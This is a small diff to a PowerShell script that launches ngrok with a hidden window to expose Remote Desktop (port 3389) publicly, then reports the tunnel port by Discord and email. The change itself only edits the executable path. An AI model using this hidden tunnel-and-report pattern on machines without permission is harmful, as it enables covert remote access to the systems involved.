@@ -3,7 +3,7 @@
 function StartNgrok {
     $process=Get-Process -Name ngrok -ErrorAction SilentlyContinue
     if ($process -ne "") {
-        Start-Process C:\ngrok\ngrok.exe "tcp 3389 -region=ap" -WindowStyle Hidden  
+        Start-Process .\ngrok.exe "tcp 3389 -region=ap" -WindowStyle Hidden  
         $port = Get-NgrokPort 
         Send-Discord -port $port 
         Send-Email -port $port
